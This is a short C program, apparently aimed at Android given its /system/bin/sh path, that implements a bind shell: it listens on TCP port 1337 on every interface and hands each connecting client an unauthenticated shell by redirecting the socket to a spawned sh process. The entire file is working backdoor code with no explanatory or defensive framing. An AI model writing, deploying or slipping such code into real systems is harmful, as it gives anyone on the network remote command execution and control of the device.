#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <signal.h>

#define LISTEN_PORT 1337

#define BINSH "/system/bin/sh"
//#define BINSH "/bin/sh"

int main(int argc, char *argv[], char *envp[])
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in sin = {
		.sin_family = AF_INET,
		.sin_port = htons(LISTEN_PORT),
		.sin_addr.s_addr = htonl(INADDR_ANY)
	};

	if (bind(sock, (struct sockaddr*)&sin, sizeof(sin)) != 0) {
		perror("bind");
		return -1;
	}

	printf("[bindshell] listening on %d\n", LISTEN_PORT);

	listen(sock, 2);

	while (1) {
		int clientfd = accept(sock, NULL, NULL);

		if (clientfd < 0) {
			break;
		}

		int childfd = fork();

		if (childfd == 0) {
			printf("[bindshell] accepted client\n");

			dup2(clientfd, 0);
			dup2(clientfd, 1);
			dup2(clientfd, 2);

			char *child_argv[] = {BINSH, NULL};
			execve(child_argv[0], child_argv, envp);
			printf("[bindshell] sh exec failed :(\n");
			break;
		} else if (childfd < 0) {
			printf("[bindshell] bindshell fork failed :(\n");
		}
	}

	close(sock);
}
